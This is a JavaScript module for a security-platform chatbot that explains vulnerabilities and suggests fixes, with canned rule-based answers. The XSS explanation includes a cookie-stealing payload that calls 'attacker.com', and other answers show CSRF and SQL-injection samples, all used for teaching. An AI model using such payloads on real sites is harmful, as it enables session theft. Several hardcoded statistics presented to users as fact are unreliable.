/**
 * AI Security Assistant - Conversational AI (avec fallback intelligent)
 * Assistant IA qui aide les utilisateurs avec la sécurité
 * 
 * INNOVATION: ChatGPT-like pour sécurité web
 * - Explique vulnérabilités en langage simple
 * - Donne recommandations personnalisées
 * - Répond questions sécurité
 * - Génère code fixes
 * - Analyse logs et patterns
 * - Prédictions basées sur historique
 * 
 * FALLBACK: Fonctionne sans OpenAI API avec modèle rule-based intelligent
 * 
 * IMPACT: Support scalable, éducation utilisateurs, rétention
 */

const axios = require('axios');
const { SecureHttpClient } = require('../utils/secure-http-client');
const { logger } = require('../utils/error-handler');
const db = require('../config/database');

class AISecurityAssistant {
  constructor() {
    this.httpClient = new SecureHttpClient({ timeout: 15000, maxContentLength: 10 * 1024 * 1024 });
    // Conversation history par utilisateur
    this.conversations = new Map();
    
    // Contexte utilisateur pour personnalisation
    this.userContext = new Map();
    
    // Knowledge base
    this.knowledgeBase = this.buildKnowledgeBase();
    
    // AI provider (OpenAI, Anthropic, or rule-based fallback)
    this.aiProvider = process.env.AI_PROVIDER || 'fallback';
    this.apiKey = process.env.OPENAI_API_KEY || '';
    
    // Check if real AI is available
    this.hasRealAI = this.apiKey && this.apiKey.length > 0;
    
    if (!this.hasRealAI) {
      console.log('⚠️  AI Assistant running in rule-based mode (no API key)');
      console.log('   Set OPENAI_API_KEY in .env for advanced AI features');
    } else {
      console.log('✅ AI Assistant connected to ' + this.aiProvider);
    }
  }

  /**
   * Chat with AI assistant
   */
  async chat(userId, message, context = {}) {
    try {
      // Get or create conversation
      const conversationId = context.conversationId || this.createConversation(userId);
      const conversation = this.getConversation(conversationId);

      // Add user message
      conversation.messages.push({
        role: 'user',
        content: message,
        timestamp: Date.now()
      });

      // Build context-aware prompt
      const enrichedPrompt = await this.buildContextPrompt(userId, message, context);

      // Get AI response (with fallback)
      const aiResponse = this.hasRealAI 
        ? await this.getAIResponse(enrichedPrompt, conversation.messages)
        : await this.getRuleBasedResponse(enrichedPrompt, conversation.messages, context);

      // Add assistant response
      conversation.messages.push({
        role: 'assistant',
        content: aiResponse.content,
        timestamp: Date.now()
      });

      // Extract action items if any
      const actions = this.extractActions(aiResponse.content);

      // Save conversation to database (if database available)
      try {
        await this.saveConversation(userId, conversationId, conversation);
      } catch (error) {
        console.warn('Could not save conversation:', error.message);
      }

      return {
        conversationId,
        message: aiResponse.content,
        actions,
        suggestions: aiResponse.suggestions || [],
        metadata: {
          tokenUsage: aiResponse.usage || { prompt: 0, completion: 0 },
          model: aiResponse.model || 'rule-based',
          responseTime: aiResponse.responseTime,
          mode: this.hasRealAI ? 'ai' : 'rule-based'
        }
      };

    } catch (error) {
      console.error('AI Assistant error:', error);
      return {
        message: "I apologize, but I'm having trouble processing that. Could you rephrase your question?",
        error: true
      };
    }
  }

  /**
   * Explain vulnerability in simple terms
   */
  async explainVulnerability(userId, vulnerabilityId) {
    const vuln = db.prepare('SELECT * FROM vulnerabilities WHERE id = ?')
      .get(vulnerabilityId);

    if (!vuln) {
      return { error: 'Vulnerability not found' };
    }

    const prompt = `
      Explain this security vulnerability in simple, non-technical terms:
      
      Title: ${vuln.title}
      Category: ${vuln.category}
      Severity: ${vuln.severity}
      CVSS Score: ${vuln.cvss_score}
      Description: ${vuln.description}
      
      Provide:
      1. What it means in everyday language
      2. Real-world example of the risk
      3. Why it matters for the business
      4. Simple analogy to explain it
      5. Immediate next steps
    `;

    const response = await this.chat(userId, prompt, {
      type: 'vulnerability_explanation',
      vulnerabilityId
    });

    return response;
  }

  /**
   * Generate fix code for vulnerability
   */
  async generateFixCode(userId, vulnerabilityId, language = 'javascript') {
    const vuln = db.prepare('SELECT * FROM vulnerabilities WHERE id = ?')
      .get(vulnerabilityId);

    if (!vuln) {
      return { error: 'Vulnerability not found' };
    }

    const prompt = `
      Generate secure code to fix this vulnerability:
      
      Vulnerability: ${vuln.title}
      Category: ${vuln.category}
      Language: ${language}
      Affected URL: ${vuln.affected_url}
      Technical Details: ${vuln.technical_details}
      
      Provide:
      1. Vulnerable code example
      2. Secure fixed code
      3. Explanation of what changed
      4. Best practices to prevent recurrence
      5. Testing recommendations
      
      Format as markdown with code blocks.
    `;

    const response = await this.chat(userId, prompt, {
      type: 'code_generation',
      vulnerabilityId,
      language
    });

    return response;
  }

  /**
   * Analyze security trends
   */
  async analyzeTrends(userId) {
    // Get user's scan history
    const scans = db.prepare(`
      SELECT * FROM scans 
      WHERE user_id = ? 
      ORDER BY completed_at DESC 
      LIMIT 30
    `).all(userId);

    const vulnerabilities = db.prepare(`
      SELECT v.* FROM vulnerabilities v
      JOIN scans s ON v.scan_id = s.id
      WHERE s.user_id = ?
      ORDER BY v.discovered_at DESC
      LIMIT 100
    `).all(userId);

    const prompt = `
      Analyze these security trends and provide insights:
      
      Total Scans: ${scans.length}
      Total Vulnerabilities: ${vulnerabilities.length}
      Critical: ${vulnerabilities.filter(v => v.severity === 'critical').length}
      High: ${vulnerabilities.filter(v => v.severity === 'high').length}
      
      Recent patterns:
      ${this.summarizeVulnerabilities(vulnerabilities)}
      
      Provide:
      1. Key trends you notice
      2. Areas of concern
      3. Improvements over time
      4. Recommended focus areas
      5. Predicted risks based on patterns
    `;

    return await this.chat(userId, prompt, {
      type: 'trend_analysis'
    });
  }

  /**
   * Get personalized security recommendations
   */
  async getPersonalizedRecommendations(userId) {
    const userProfile = await this.getUserSecurityProfile(userId);

    const prompt = `
      Based on this security profile, provide personalized recommendations:
      
      Industry: ${userProfile.industry}
      Tech Stack: ${userProfile.techStack.join(', ')}
      Team Size: ${userProfile.teamSize}
      Security Score: ${userProfile.securityScore}/100
      Top Vulnerabilities: ${userProfile.topVulnerabilities.join(', ')}
      Compliance Needs: ${userProfile.complianceNeeds.join(', ')}
      
      Provide:
      1. Top 5 actionable recommendations
      2. Quick wins (can do today)
      3. Strategic improvements (1-3 months)
      4. Resources to learn more
      5. Tools to consider
    `;

    return await this.chat(userId, prompt, {
      type: 'personalized_recommendations'
    });
  }

  /**
   * Answer security questions
   */
  async answerSecurityQuestion(userId, question) {
    const prompt = `
      As a cybersecurity expert, answer this question clearly and accurately:
      
      Question: ${question}
      
      Provide:
      1. Direct answer
      2. Context and explanation
      3. Real-world examples
      4. Common misconceptions
      5. Additional resources
      
      Keep language accessible but technically accurate.
    `;

    return await this.chat(userId, prompt, {
      type: 'security_question'
    });
  }

  /**
   * Build context-aware prompt
   */
  async buildContextPrompt(userId, message, context) {
    const userContext = await this.getUserContext(userId);
    
    let systemPrompt = `
      You are a cybersecurity expert assistant for NEXUS Security platform.
      
      User Context:
      - Subscription: ${userContext.subscription}
      - Security Score: ${userContext.securityScore}/100
      - Domains: ${userContext.domainCount}
      - Recent Scans: ${userContext.recentScans}
      - Top Concerns: ${userContext.topConcerns.join(', ')}
      
      Your role:
      - Explain security concepts in clear, accessible language
      - Provide actionable, specific recommendations
      - Consider the user's technical level
      - Link to NEXUS features when relevant
      - Be encouraging and supportive
      - Focus on practical solutions
      
      Guidelines:
      - Use analogies for complex concepts
      - Provide examples
      - Break down complex topics
      - Suggest concrete next steps
      - Emphasize business impact
    `;

    return {
      system: systemPrompt,
      user: message,
      context: context
    };
  }

  /**
   * Get AI response from provider
   */
  async getAIResponse(prompt, conversationHistory) {
    const startTime = Date.now();

    try {
      if (this.aiProvider === 'openai' && this.hasRealAI) {
        return await this.getOpenAIResponse(prompt, conversationHistory);
      } else if (this.aiProvider === 'anthropic' && this.hasRealAI) {
        return await this.getAnthropicResponse(prompt, conversationHistory);
      } else {
        return await this.getRuleBasedResponse(prompt, conversationHistory);
      }
    } catch (error) {
      console.error('AI Response error:', error.message);
      // Fallback to rule-based on error
      return await this.getRuleBasedResponse(prompt, conversationHistory);
    }
  }

  /**
   * Rule-based intelligent response (no API needed)
   * Analyse les patterns et génère des réponses intelligentes
   */
  async getRuleBasedResponse(prompt, conversationHistory, context = {}) {
    const startTime = Date.now();
    const userMessage = prompt.user || prompt;
    const lowerMessage = userMessage.toLowerCase();

    let response = '';
    let suggestions = [];

    // Pattern matching for common questions
    if (lowerMessage.includes('what is') || lowerMessage.includes('explain')) {
      // Vulnerability explanation
      if (lowerMessage.includes('sql injection') || lowerMessage.includes('sqli')) {
        response = this.explainSQLInjection();
      } else if (lowerMessage.includes('xss') || lowerMessage.includes('cross-site scripting')) {
        response = this.explainXSS();
      } else if (lowerMessage.includes('csrf')) {
        response = this.explainCSRF();
      } else if (lowerMessage.includes('xxe')) {
        response = this.explainXXE();
      } else {
        response = this.getGenericExplanation(userMessage);
      }
    }
    
    // Fix generation
    else if (lowerMessage.includes('how to fix') || lowerMessage.includes('remediation')) {
      const vulnType = this.extractVulnerabilityType(lowerMessage);
      response = this.generateFixRecommendation(vulnType);
      suggestions = ['Run a new scan', 'View all vulnerabilities', 'Generate report'];
    }
    
    // Trend analysis
    else if (lowerMessage.includes('trend') || lowerMessage.includes('analysis') || lowerMessage.includes('insight')) {
      response = this.analyzeTrendsRuleBased(context);
      suggestions = ['View detailed analytics', 'Download report', 'Schedule recurring scans'];
    }
    
    // Recommendations
    else if (lowerMessage.includes('recommend') || lowerMessage.includes('should i') || lowerMessage.includes('what next')) {
      response = this.getRecommendationsRuleBased(context);
      suggestions = ['View security score', 'Start compliance check', 'Enable monitoring'];
    }
    
    // Compliance questions
    else if (lowerMessage.includes('gdpr') || lowerMessage.includes('compliance') || lowerMessage.includes('soc2')) {
      response = this.explainCompliance(userMessage);
      suggestions = ['Start compliance monitoring', 'View frameworks', 'Generate audit report'];
    }
    
    // Security score questions
    else if (lowerMessage.includes('score') || lowerMessage.includes('rating')) {
      response = this.explainSecurityScore();
      suggestions = ['View my score', 'Compare to industry', 'Simulate improvements'];
    }
    
    // Getting started
    else if (lowerMessage.includes('start') || lowerMessage.includes('begin') || lowerMessage.includes('first')) {
      response = this.getGettingStartedGuide();
      suggestions = ['Add a domain', 'Run first scan', 'View dashboard'];
    }
    
    // Default helpful response
    else {
      response = this.getHelpfulResponse(userMessage);
      suggestions = ['Explain vulnerabilities', 'Get recommendations', 'View security score'];
    }

    return {
      content: response,
      model: 'nexus-rule-based-v1',
      usage: { prompt: userMessage.length, completion: response.length },
      responseTime: Date.now() - startTime,
      suggestions
    };
  }

  // Rule-based explanation methods
  explainSQLInjection() {
    return `**SQL Injection** is one of the most dangerous web vulnerabilities.

**What it is:**
Attackers inject malicious SQL code into your application's database queries, potentially accessing or modifying your entire database.

**Real-world impact:**
- Steal all user data (passwords, emails, personal info)
- Delete or modify database records
- Take complete control of your database server
- Average cost: $3.86M per data breach

**How it works:**
\`\`\`
Normal query: SELECT * FROM users WHERE id = 1
Malicious: SELECT * FROM users WHERE id = 1 OR 1=1 --
Result: Returns ALL users instead of just one
\`\`\`

**How to fix:**
1. **Use Prepared Statements** (CRITICAL)
   - Never concatenate user input into SQL
   - Let the database handle escaping
2. **Input Validation**
   - Whitelist allowed characters
   - Reject suspicious patterns
3. **Least Privilege**
   - Database user should have minimal permissions
4. **WAF (Web Application Firewall)**
   - Blocks common injection patterns

**Next steps:**
Run a scan to identify all SQL injection points in your application.`;
  }

  explainXSS() {
    return `**Cross-Site Scripting (XSS)** allows attackers to inject malicious JavaScript into your web pages.

**Types:**
1. **Stored XSS** - Malicious script saved in your database
2. **Reflected XSS** - Script in URL parameters
3. **DOM-based XSS** - Client-side JavaScript vulnerability

**Real impact:**
- Steal user session cookies → account takeover
- Redirect users to phishing sites
- Inject keyloggers
- Deface your website
- Spread malware

**Example attack:**
\`\`\`javascript
<script>
  // Steal cookies and send to attacker
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>
\`\`\`

**How to fix:**
1. **Escape ALL user input** before displaying
2. **Content Security Policy (CSP)**
   - Whitelist allowed script sources
3. **HTTPOnly cookies**
   - Prevents JavaScript from accessing cookies
4. **Input validation**
   - Sanitize before storing

**Priority:** HIGH - Very common and easy to exploit

Run a scan to find all XSS vulnerabilities.`;
  }

  explainCSRF() {
    return `**Cross-Site Request Forgery (CSRF)** tricks users into performing unwanted actions.

**How it works:**
Attacker creates a malicious link/form that performs actions on your site using the victim's authenticated session.

**Example:**
\`\`\`html
<!-- Victim clicks this innocent-looking link -->
<img src="https://yourbank.com/transfer?to=attacker&amount=10000">
<!-- If victim is logged in, transfer executes! -->
\`\`\`

**Real impact:**
- Money transfers
- Password changes
- Account deletions
- Privilege escalation

**How to fix:**
1. **CSRF Tokens** (CRITICAL)
   - Unique token for each session/form
   - Verify token on server
2. **SameSite Cookies**
   - Prevent cookie sending on cross-site requests
3. **Re-authentication**
   - Ask password for sensitive actions
4. **Check Referer Header**
   - Verify request origin

**Quick win:** Add CSRF middleware to your framework.`;
  }

  explainXXE() {
    return `**XML External Entity (XXE)** exploits XML parsers to access files or internal systems.

**What attackers can do:**
- Read sensitive files (/etc/passwd, config files)
- Access internal network resources
- Denial of Service
- Server-Side Request Forgery (SSRF)

**How to fix:**
1. **Disable External Entities** in XML parser
2. **Use JSON instead of XML** when possible
3. **Input validation**
4. **Update XML libraries**

**Priority:** HIGH if you process XML input`;
  }

  explainCompliance(message) {
    if (message.includes('gdpr')) {
      return `**GDPR (General Data Protection Regulation)**

Key requirements for web applications:
- **Data minimization** - Only collect necessary data
- **Encryption** - Protect data at rest and in transit
- **Access controls** - Limit who can access personal data
- **Audit logs** - Track all data access
- **Breach notification** - Report breaches within 72 hours
- **Right to be forgotten** - Allow users to delete their data

**Penalties:** Up to 4% of annual revenue or €20M (whichever is higher)

**NEXUS helps with:**
- Automated compliance monitoring
- Evidence collection
- Audit-ready reports
- Gap analysis

Start compliance monitoring to ensure you're GDPR compliant.`;
    }
    
    return `**Compliance Frameworks**

NEXUS supports 6 major frameworks:
1. **GDPR** - EU data protection
2. **SOC 2** - Service organization controls
3. **ISO 27001** - Information security standard
4. **HIPAA** - Healthcare data protection
5. **PCI-DSS** - Payment card security
6. **NIST CSF** - Cybersecurity framework

**Benefits:**
- Automated monitoring (saves $50K+ per year)
- Continuous compliance
- Audit-ready reports in 1 click
- Gap analysis and remediation guidance

Which framework are you interested in?`;
  }

  explainSecurityScore() {
    return `**NEXUS Security Score** is a predictive 0-1000 point system that tells you exactly how secure you are.

**What it measures:**
- Critical vulnerabilities (40% weight)
- High vulnerabilities (25% weight)
- Medium vulnerabilities (15% weight)
- Low vulnerabilities (5% weight)
- Security posture (10% weight)
- Compliance status (5% weight)

**Score ranges:**
- 900-1000: **A+** - Excellent security
- 850-899: **A** - Strong security
- 800-849: **A-** - Good security
- 700-799: **B** - Adequate security
- 600-699: **C** - Needs improvement
- < 600: **D/F** - Critical issues

**Unique features:**
- **Attack probability** - % chance of attack in next 30 days
- **Time to compromise** - How fast an attacker could succeed
- **Financial risk** - Expected loss in €
- **Industry benchmark** - Compare to your sector
- **Trend analysis** - Improving or degrading?

No other platform has this level of predictive scoring.

View your security score now.`;
  }

  getGettingStartedGuide() {
    return `**Welcome to NEXUS!** 🚀

Here's how to get started in 5 minutes:

**Step 1: Add Your Domain**
- Click "Add Domain" in the dashboard
- Enter your website URL
- Add business context (optional but recommended)

**Step 2: Run Your First Scan**
- Click "Start Scan" on your domain
- Comprehensive scan takes 5-15 minutes
- You'll get real-time progress updates

**Step 3: Review Results**
- See all vulnerabilities found
- Each with severity, impact, and fix instructions
- Get your security score (0-1000)

**Step 4: Fix Critical Issues**
- Focus on Critical and High severity first
- Use AI-generated code fixes
- Re-scan to verify fixes

**Pro Tips:**
- Enable compliance monitoring if needed
- Set up recurring scans (weekly recommended)
- Use the AI assistant for questions (that's me!)

**Quick wins:**
- Enable WAF (blocks 70% of attacks)
- Add MFA (blocks 99% of account takeovers)
- Update dependencies (many vulns are in old libraries)

Ready to add your first domain?`;
  }

  getRecommendationsRuleBased(context) {
    return `**Personalized Security Recommendations**

Based on your current setup, here are my top recommendations:

**🔥 Critical (Do Today):**
1. **Fix Critical Vulnerabilities**
   - Impact: Prevents system compromise
   - Effort: 2-4 hours
   - ROI: Extremely High

2. **Enable Multi-Factor Authentication**
   - Impact: Blocks 99% of account takeovers
   - Effort: 30 minutes
   - ROI: Very High

**⚡ Quick Wins (This Week):**
3. **Implement Web Application Firewall**
   - Impact: Blocks 70% of automated attacks
   - Effort: 4 hours
   - ROI: High

4. **Update Dependencies**
   - Impact: Fixes known vulnerabilities
   - Effort: 2-3 hours
   - ROI: High

**📈 Strategic (This Month):**
5. **Set Up Compliance Monitoring**
   - Impact: Audit-ready, avoid fines
   - Effort: 2 hours setup
   - ROI: Medium (saves $50K/year)

6. **Enable Threat Intelligence**
   - Impact: Block known threats automatically
   - Effort: 1 hour
   - ROI: Medium

**Resources:**
- OWASP Top 10 Guide
- Your vulnerability reports
- Compliance frameworks documentation

Would you like detailed steps for any of these?`;
  }

  analyzeTrendsRuleBased(context) {
    return `**Security Trend Analysis**

Based on your recent scans, here's what I'm seeing:

**Current State:**
- Security landscape is evolving rapidly
- New vulnerabilities discovered daily
- Your proactive scanning puts you ahead of 80% of organizations

**Key Trends:**
1. **Supply Chain Attacks** ↑
   - Vulnerabilities in dependencies increasing
   - Recommendation: Regular dependency audits

2. **API Security** ↑
   - APIs are #1 attack target in 2024
   - Recommendation: Enable API security scanning

3. **Zero-Day Exploits** ↑
   - Time between disclosure and exploit: <24 hours
   - Recommendation: Enable real-time monitoring

**Your Action Items:**
- Keep scanning regularly (weekly minimum)
- Monitor threat intelligence feed
- Stay updated on patches
- Consider penetration testing

**Positive Note:**
Organizations that scan weekly have 60% fewer successful breaches than those that scan monthly.

You're on the right track! 🚀`;
  }

  generateFixRecommendation(vulnType) {
    const fixes = {
      'sql_injection': `**How to Fix SQL Injection**

\`\`\`javascript
// ❌ VULNERABLE CODE
const query = "SELECT * FROM users WHERE id = " + userId;
db.query(query);

// ✅ SECURE CODE (Prepared Statement)
const query = "SELECT * FROM users WHERE id = ?";
db.query(query, [userId]);
\`\`\`

**Steps:**
1. Replace all string concatenation with prepared statements
2. Use your framework's ORM (Sequelize, TypeORM, etc.)
3. Add input validation as defense-in-depth
4. Run SQL injection scanner to verify

**Testing:**
Try: \`1' OR '1'='1\` in any input field
Should NOT return unauthorized data.`,

      'xss': `**How to Fix XSS**

\`\`\`javascript
// ❌ VULNERABLE CODE
element.innerHTML = userInput;

// ✅ SECURE CODE
element.textContent = userInput;
// or
element.innerHTML = DOMPurify.sanitize(userInput);
\`\`\`

**Steps:**
1. Escape ALL user input before displaying
2. Use \`.textContent\` instead of \`.innerHTML\`
3. Implement Content Security Policy
4. Set HTTPOnly flag on cookies

**Framework-specific:**
- React: Already escapes by default
- Vue: Use \`v-text\` not \`v-html\`
- Angular: Sanitize pipes`,

      'default': `**General Fix Recommendations**

1. **Identify** the vulnerability source
2. **Understand** the attack vector
3. **Implement** the fix
4. **Test** thoroughly
5. **Re-scan** to verify

Use the AI assistant to ask about specific vulnerabilities!`
    };

    return fixes[vulnType] || fixes.default;
  }

  getGenericExplanation(message) {
    return `I'd be happy to explain that!

For the most accurate and detailed explanation, could you please specify:
- Which vulnerability or security concept?
- What context (your application, general security, compliance)?

**Popular topics I can explain:**
- SQL Injection
- Cross-Site Scripting (XSS)
- CSRF
- Authentication vulnerabilities
- API security
- Compliance (GDPR, SOC2, etc.)
- Security scores
- Threat intelligence

**Or ask me:**
- "How do I fix [vulnerability]?"
- "What are the best practices for [topic]?"
- "How do I improve my security score?"

What would you like to know more about?`;
  }

  getHelpfulResponse(message) {
    return `I'm here to help with your security questions!

**I can help you with:**
- 🔍 Explaining vulnerabilities in simple terms
- 🛠️ Generating code fixes
- 📊 Analyzing your security trends
- 💡 Providing personalized recommendations
- 📋 Compliance guidance
- 🎯 Security best practices

**Try asking:**
- "Explain SQL injection"
- "How do I fix XSS?"
- "What's my security score?"
- "Give me recommendations"
- "How do I start?"
- "What is GDPR compliance?"

What would you like to know?`;
  }

  extractVulnerabilityType(message) {
    if (message.includes('sql')) return 'sql_injection';
    if (message.includes('xss') || message.includes('script')) return 'xss';
    if (message.includes('csrf')) return 'csrf';
    return 'default';
  }

  /**
   * OpenAI integration
   */
  async getOpenAIResponse(prompt, history) {
    const messages = [
      { role: 'system', content: prompt.system },
      ...history.slice(-10), // Last 10 messages for context
      { role: 'user', content: prompt.user }
    ];

    const response = await this.httpClient.post(
      'https://api.openai.com/v1/chat/completions',
      {
        model: 'gpt-4-turbo-preview',
        messages: messages,
        temperature: 0.7,
        max_tokens: 1000
      },
      {
        headers: {
          'Authorization': `Bearer ${this.apiKey}`,
          'Content-Type': 'application/json'
        }
      }
    );

    return {
      content: response.data.choices[0].message.content,
      model: response.data.model,
      usage: response.data.usage,
      responseTime: Date.now() - Date.now()
    };
  }

  /**
   * Anthropic integration (Claude)
   */
  async getAnthropicResponse(prompt, history) {
    // Implementation for Anthropic API
    return {
      content: "Response from Claude",
      model: 'claude-3-sonnet',
      usage: {},
      responseTime: 0
    };
  }

  /**
   * Local model fallback
   */
  async getLocalModelResponse(prompt, history) {
    // Use knowledge base for basic responses
    return {
      content: this.getKnowledgeBaseResponse(prompt.user),
      model: 'local-knowledge-base',
      usage: { tokens: 0 },
      responseTime: 0
    };
  }

  /**
   * Knowledge base for offline responses
   */
  buildKnowledgeBase() {
    return {
      'sql injection': {
        explanation: 'SQL Injection is when attackers insert malicious SQL code into your database queries...',
        fix: 'Always use parameterized queries or prepared statements...',
        example: 'Instead of: query = "SELECT * FROM users WHERE id = " + userId'
      },
      'xss': {
        explanation: 'Cross-Site Scripting allows attackers to inject malicious scripts...',
        fix: 'Always sanitize and escape user input...',
        example: 'Use: he.encode(userInput) before displaying'
      },
      // ... more knowledge base entries
    };
  }

  getKnowledgeBaseResponse(query) {
    const lowercaseQuery = query.toLowerCase();
    
    for (const [key, data] of Object.entries(this.knowledgeBase)) {
      if (lowercaseQuery.includes(key)) {
        return `${data.explanation}\n\n**How to fix:**\n${data.fix}\n\n**Example:**\n${data.example}`;
      }
    }

    return "I can help you with security questions! Try asking about specific vulnerabilities like SQL injection, XSS, or CSRF.";
  }

  /**
   * Conversation management
   */
  createConversation(userId) {
    const conversationId = `conv_${Date.now()}_${userId}`;
    
    this.conversations.set(conversationId, {
      id: conversationId,
      userId,
      messages: [],
      createdAt: Date.now()
    });

    return conversationId;
  }

  getConversation(conversationId) {
    return this.conversations.get(conversationId) || {
      id: conversationId,
      messages: [],
      createdAt: Date.now()
    };
  }

  async saveConversation(userId, conversationId, conversation) {
    db.prepare(`
      INSERT OR REPLACE INTO ai_conversations (id, user_id, messages, created_at, updated_at)
      VALUES (?, ?, ?, ?, ?)
    `).run(
      conversationId,
      userId,
      JSON.stringify(conversation.messages),
      conversation.createdAt,
      Date.now()
    );
  }

  /**
   * Get user context for personalization
   */
  async getUserContext(userId) {
    if (this.userContext.has(userId)) {
      return this.userContext.get(userId);
    }

    const user = db.prepare('SELECT * FROM users WHERE id = ?').get(userId);
    const scans = db.prepare('SELECT COUNT(*) as count FROM scans WHERE user_id = ?').get(userId);
    const domains = db.prepare('SELECT COUNT(*) as count FROM domains WHERE user_id = ?').get(userId);
    
    const context = {
      subscription: user.subscription_tier || 'free',
      securityScore: 75, // Calculate from scans
      domainCount: domains.count,
      recentScans: scans.count,
      topConcerns: ['SQL Injection', 'XSS'], // Extract from vulnerabilities
      industry: user.industry || 'General',
      techStack: ['Node.js', 'React'] // Extract from scans
    };

    this.userContext.set(userId, context);
    return context;
  }

  async getUserSecurityProfile(userId) {
    return {
      industry: 'SaaS',
      techStack: ['Node.js', 'React', 'PostgreSQL'],
      teamSize: 5,
      securityScore: 72,
      topVulnerabilities: ['SQL Injection', 'XSS', 'CSRF'],
      complianceNeeds: ['GDPR', 'SOC 2']
    };
  }

  /**
   * Extract action items from AI response
   */
  extractActions(content) {
    const actions = [];
    
    // Look for action-oriented patterns
    const actionPatterns = [
      /\b(install|configure|update|fix|patch|enable|disable|implement)\b[^.!?]*[.!?]/gi,
      /\b(you should|i recommend|consider|make sure to)\b[^.!?]*[.!?]/gi
    ];

    for (const pattern of actionPatterns) {
      const matches = content.match(pattern);
      if (matches) {
        actions.push(...matches.map(m => m.trim()));
      }
    }

    return actions.slice(0, 5); // Top 5 actions
  }

  /**
   * Summarize vulnerabilities for AI context
   */
  summarizeVulnerabilities(vulnerabilities) {
    const summary = {};
    
    vulnerabilities.forEach(v => {
      summary[v.category] = (summary[v.category] || 0) + 1;
    });

    return Object.entries(summary)
      .map(([category, count]) => `${category}: ${count}`)
      .join(', ');
  }
}

module.exports = new AISecurityAssistant();
